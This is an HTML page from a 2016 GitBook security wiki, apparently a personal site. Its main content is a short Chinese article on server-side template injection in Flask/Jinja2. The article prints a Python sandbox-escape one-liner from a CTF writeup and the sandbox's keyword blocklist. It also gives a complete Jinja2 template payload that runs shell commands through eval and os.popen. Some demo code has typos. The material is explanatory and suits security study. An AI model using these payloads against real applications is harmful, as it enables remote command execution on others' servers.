+        <li class="chapter " data-level="1.7.4" data-path="../PHP/正则匹配.html">
+            
+                <a href="../PHP/正则匹配.html">
+            
+                    
+                    正则匹配
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" >
+            
+                <span>
+            
+                    
+                    Docker
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1" data-path="../Docker/docker-compose.html">
+            
+                <a href="../Docker/docker-compose.html">
+            
+                    
+                    Docker Compose
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" data-path="../Docker/dockerfile.html">
+            
+                <a href="../Docker/dockerfile.html">
+            
+                    
+                    Dockerfile
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3" data-path="../Docker/docker-api-in-python.html">
+            
+                <a href="../Docker/docker-api-in-python.html">
+            
+                    
+                    docker api in python
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.4" data-path="../Docker/locale.html">
+            
+                <a href="../Docker/locale.html">
+            
+                    
+                    locale
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.5" data-path="../Docker/note.html">
+            
+                <a href="../Docker/note.html">
+            
+                    
+                    note
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.6" data-path="../Docker/openvpn.html">
+            
+                <a href="../Docker/openvpn.html">
+            
+                    
+                    openvpn
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.7" data-path="../Docker/安装和基本命令.html">
+            
+                <a href="../Docker/安装和基本命令.html">
+            
+                    
+                    安装和基本命令
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.8" data-path="../Docker/常用开发环境.html">
+            
+                <a href="../Docker/常用开发环境.html">
+            
+                    
+                    常用开发环境
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.9" data-path="../Docker/微容器.html">
+            
+                <a href="../Docker/微容器.html">
+            
+                    
+                    微容器
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.10" data-path="../Docker/心得.html">
+            
+                <a href="../Docker/心得.html">
+            
+                    
+                    心得
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.11" data-path="../Docker/持续集成与自动发布.html">
+            
+                <a href="../Docker/持续集成与自动发布.html">
+            
+                    
+                    持续集成与自动发布
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" >
+            
+                <span>
+            
+                    
+                    HTTP
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.9.1" data-path="../HTTP/cookie.html">
+            
+                <a href="../HTTP/cookie.html">
+            
+                    
+                    Cookie
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.2" data-path="../HTTP/encode_and_decode.html">
+            
+                <a href="../HTTP/encode_and_decode.html">
+            
+                    
+                    Encode and Decode
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.3" data-path="../HTTP/http请求格式.html">
+            
+                <a href="../HTTP/http请求格式.html">
+            
+                    
+                    HTTP请求格式
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.4" data-path="../HTTP/proxy.html">
+            
+                <a href="../HTTP/proxy.html">
+            
+                    
+                    Proxy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.5" data-path="../HTTP/xpath.html">
+            
+                <a href="../HTTP/xpath.html">
+            
+                    
+                    XPATH
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10" >
+            
+                <span>
+            
+                    
+                    Git
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.10.1" data-path="../Git/gist.html">
+            
+                <a href="../Git/gist.html">
+            
+                    
+                    Gist
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10.2" data-path="../Git/git.html">
+            
+                <a href="../Git/git.html">
+            
+                    
+                    git
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10.3" data-path="../Git/git_remote_operation.html">
+            
+                <a href="../Git/git_remote_operation.html">
+            
+                    
+                    git remote operation
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.11" >
+            
+                <span>
+            
+                    
+                    Image
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.11.1" data-path="../Image/png.html">
+            
+                <a href="../Image/png.html">
+            
+                    
+                    PNG
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.12" >
+            
+                <span>
+            
+                    
+                    JS
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.12.1" data-path="../JS/xhr.html">
+            
+                <a href="../JS/xhr.html">
+            
+                    
+                    XHR
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13" >
+            
+                <span>
+            
+                    
+                    Note
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.13.1" data-path="../Note/ctf.html">
+            
+                <a href="../Note/ctf.html">
+            
+                    
+                    CTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.2" data-path="../Note/elk.html">
+            
+                <a href="../Note/elk.html">
+            
+                    
+                    ELK
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.3" data-path="../Note/google-hacking.html">
+            
+                <a href="../Note/google-hacking.html">
+            
+                    
+                    Google Hacking
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.4" data-path="../Note/sql.html">
+            
+                <a href="../Note/sql.html">
+            
+                    
+                    Sql
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.5" data-path="../Note/mysql.html">
+            
+                <a href="../Note/mysql.html">
+            
+                    
+                    mysql
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.6" data-path="../Note/same-origin-policy.html">
+            
+                <a href="../Note/same-origin-policy.html">
+            
+                    
+                    same origin policy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.7" data-path="../Note/software.html">
+            
+                <a href="../Note/software.html">
+            
+                    
+                    software
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14" >
+            
+                <span>
+            
+                    
+                    AWS
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.14.1" data-path="../AWS/note.html">
+            
+                <a href="../AWS/note.html">
+            
+                    
+                    note
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.15" >
+            
+                <span>
+            
+                    
+                    Python3
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.15.1" data-path="../Python3/string.html">
+            
+                <a href="../Python3/string.html">
+            
+                    
+                    String
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.16" >
+            
+                <span>
+            
+                    
+                    Simiki
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.16.1" data-path="../Simiki/simiki-命令.html">
+            
+                <a href="../Simiki/simiki-命令.html">
+            
+                    
+                    simiki 命令
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.16.2" data-path="../Simiki/start with github page.html">
+            
+                <a href="../Simiki/start with github page.html">
+            
+                    
+                    start github page
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >SSTI Jinja2</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="python-&#x6A21;&#x677F;&#x5F15;&#x64CE;-jinja2&#x5B58;&#x5728;&#x670D;&#x52A1;&#x7AEF;&#x6A21;&#x677F;&#x6CE8;&#x5165;ssti">python &#x6A21;&#x677F;&#x5F15;&#x64CE; Jinja2&#x5B58;&#x5728;&#x670D;&#x52A1;&#x7AEF;&#x6A21;&#x677F;&#x6CE8;&#x5165;(SSTI)</h1><p><a href="https://twitter.com/nvisium" target="_blank">@nvisium</a> &#x5728;&#x5176;&#x535A;&#x5BA2;&#x53D1;&#x8868;&#x6587;&#x7AE0; <a href="https://nvisium.com/blog/2015/12/07/injecting-flask/" target="_blank">&#x300A;Inject Flask&#x300B;</a>&#xFF0C;&#x63A7;&#x5236;Jinja&#x6A21;&#x677F;&#x5185;&#x5BB9;&#x65F6;&#x5229;&#x7528;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x4E2D;&#x5DF2;&#x6CE8;&#x518C;&#x7684;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x6076;&#x610F;&#x8C03;&#x7528;&#x6216;&#x5229;&#x7528;&#x6E32;&#x67D3;&#x8FDB;&#x884C;XSS&#x7B49;</p><p>&#x4E4C;&#x4E91;&#x6587;&#x7AE0;<a href="http://drops.wooyun.org/web/13057" target="_blank"> &#x5229;&#x7528; Python &#x7279;&#x6027;&#x5728; Jinja2 &#x6A21;&#x677F;&#x4E2D;&#x6267;&#x884C;&#x4EFB;&#x610F;&#x4EE3;&#x7801; </a>&#x63D0;&#x5230;Jinja2&#x6A21;&#x677F;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x4E00;&#x4E9B;python&#x5185;&#x7F6E;&#x53D8;&#x91CF;&#xFF0C;&#x5982; [], {} &#x7B49;&#xFF0C;&#x5E76;&#x4E14;&#x80FD;&#x591F;&#x4F7F;&#x7528;python&#x53D8;&#x91CF;&#x7C7B;&#x578B;&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x51FD;&#x6570;&#x3002;</p><p>&#x8BBF;&#x95EE;&#x7684;&#x5177;&#x6709;&#x7279;&#x6B8A;&#x610F;&#x4E49;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF1A;</p><pre><code class="lang-python"><span class="hljs-keyword">from</span> Jinja2 <span class="hljs-keyword">import</span> Template
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject</span><span class="hljs-params">(cmd)</span>:</span>
+    <span class="hljs-keyword">return</span> Template(<span class="hljs-string">&quot;input:{{ %s }}&quot;</span> % cmd).render()
+
+<span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> __builtins__.__dict__.keys():
+    msg = inject(f+<span class="hljs-string">&quot;.__class__&quot;</span>)
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&apos;Undefined&apos;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> msg:
+        print(<span class="hljs-string">&quot;{f}: {msg}&quot;</span>.format(f=f, msg=msg))
+
+&gt;&gt;&gt;
+dict: input:&lt;type <span class="hljs-string">&apos;function&apos;</span>&gt;
+<span class="hljs-keyword">False</span>: input:&lt;type <span class="hljs-string">&apos;bool&apos;</span>&gt;
+<span class="hljs-keyword">True</span>: input:&lt;type <span class="hljs-string">&apos;bool&apos;</span>&gt;
+<span class="hljs-keyword">None</span>: input:&lt;type <span class="hljs-string">&apos;NoneType&apos;</span>&gt;
+range: input:&lt;type <span class="hljs-string">&apos;type&apos;</span>&gt;</code></pre>
+<p>Jinja&#x6A21;&#x677F;&#x6267;&#x884C;python&#x4EE3;&#x7801;&#xFF0C;&#x5B98;&#x65B9;&#x8BF4;&#x660E;&#x662F;&#x9700;&#x8981;&#x5728;&#x6A21;&#x677F;&#x73AF;&#x5883;&#x4E2D;&#x6CE8;&#x518C;&#x51FD;&#x6570;&#x624D;&#x80FD;&#x5728;&#x6A21;&#x677F;&#x4E2D;&#x8C03;&#x7528;&#x3002;</p><pre><code class="lang-python"><span class="hljs-comment"># file: demo1.py</span>
+
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> sys
+form jinja2 <span class="hljs-keyword">import</span> Template
+
+template = Template(<span class="hljs-string">&quot;input: {}&quot;</span>.format(sys.argv[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> len(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&apos;&lt;empty&gt;&apos;</span>))
+tempalte.<span class="hljs-keyword">global</span>[<span class="hljs-string">&apos;os&apos;</span>] = os
+<span class="hljs-keyword">print</span> tempalte.render()
+
+
+&gt;&gt;&gt;python demo1.py <span class="hljs-string">&quot;{{ os.popen(&quot;</span>echo hello<span class="hljs-string">&quot;).read() }}&quot;</span>
+input: hello</code></pre>
+<h2 id="&#x5229;&#x7528;python&#x7279;&#x6027;&#x76F4;&#x63A5;&#x6267;&#x884C;&#x4EFB;&#x610F;&#x4EE3;&#x7801;">&#x5229;&#x7528;python&#x7279;&#x6027;&#x76F4;&#x63A5;&#x6267;&#x884C;&#x4EFB;&#x610F;&#x4EE3;&#x7801;</h2><p>python&#x6C99;&#x76D2;&#x9003;&#x9038;, &#x53C2;&#x8003;: <a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/" target="_blank">CSAW-CTF Python sandbox write-up</a></p><pre><code class="lang-python"><span class="hljs-comment"># file: sandbox.py</span>
+
+<span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function
+
+print(<span class="hljs-string">&quot;Welcome to my Python sandbox! Enter commands below!&quot;</span>)
+
+banned = [
+    <span class="hljs-string">&quot;import&quot;</span>,
+    <span class="hljs-string">&quot;exec&quot;</span>,
+    <span class="hljs-string">&quot;eval&quot;</span>,
+    <span class="hljs-string">&quot;pickle&quot;</span>,
+    <span class="hljs-string">&quot;os&quot;</span>,
+    <span class="hljs-string">&quot;subprocess&quot;</span>,
+    <span class="hljs-string">&quot;kevin sucks&quot;</span>,
+    <span class="hljs-string">&quot;input&quot;</span>,
+    <span class="hljs-string">&quot;banned&quot;</span>,
+    <span class="hljs-string">&quot;cry sum more&quot;</span>,
+    <span class="hljs-string">&quot;sys&quot;</span>
+]
+
+targets = __builtins__.__dict__.keys()
+targets.remove(<span class="hljs-string">&apos;raw_input&apos;</span>)
+targets.remove(<span class="hljs-string">&apos;print&apos;</span>)
+
+<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> targets:
+    <span class="hljs-keyword">del</span> __builtins__.__dict__[x]
+
+<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
+    print(<span class="hljs-string">&quot;&gt;&gt;&gt;&quot;</span>, end=<span class="hljs-string">&apos; &apos;</span>)
+    data = raw_input()
+    <span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> banned:
+        <span class="hljs-keyword">if</span> no.lower() <span class="hljs-keyword">in</span> data.lower():
+            print(<span class="hljs-string">&quot;No bueno&quot;</span>)
+            <span class="hljs-keyword">break</span>
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">exec</span> data</code></pre>
+<pre><code>python sandbox.py
+
+Welcome to my Python sandbox! Enter commands below!
+&gt;&gt;&gt; [c for c in [].__class__.__base__.__subclasses__() if c.__name__ == &apos;catch_warnings&apos;][0].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;echo hello sandbox&apos;)
+hello sandbox</code></pre>
+<h2 id="&#x7ED3;&#x5408;&#x6C99;&#x76D2;&#x9003;&#x9038;jiaja2&#x6A21;&#x677F;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;">&#x7ED3;&#x5408;&#x6C99;&#x76D2;&#x9003;&#x9038;Jiaja2&#x6A21;&#x677F;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;</h2><p>Jinja2 &#x6A21;&#x677F;payload</p><pre><code>{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == &apos;catch_warnings&apos; %}
+  {% for b in c.__init__.func_globals.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if &apos;eval&apos; in b.keys() %}
+      {{ b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&apos;) }}
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}</code></pre>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="php序列化.html" class="navigation navigation-prev " aria-label="Previous page: PHP序列化">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="scan_for_info.html" class="navigation navigation-next " aria-label="Next page: Scan For Information">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"SSTI Jinja2","date":"2016-03-01 10:44","level":"1.4.7","depth":2,"next":{"title":"Scan For Information","level":"1.4.8","depth":2,"path":"WebSecurity/scan_for_info.md","ref":"WebSecurity/scan_for_info.md","articles":[]},"previous":{"title":"PHP序列化","level":"1.4.6","depth":2,"path":"WebSecurity/php序列化.md","ref":"WebSecurity/php序列化.md","articles":[]},"dir":"ltr"},"config":{"plugins":["livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","author":"janes","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Wiki | janes","language":"cn","gitbook":">= 3.2.0"},"file":{"path":"WebSecurity/ssti-jinja2.md","mtime":"2016-08-16T14:00:50.461Z","type":"markdown"},"gitbook":{"version":"3.2.0","time":"2016-08-16T16:38:45.378Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
     </body>
 </html>
+
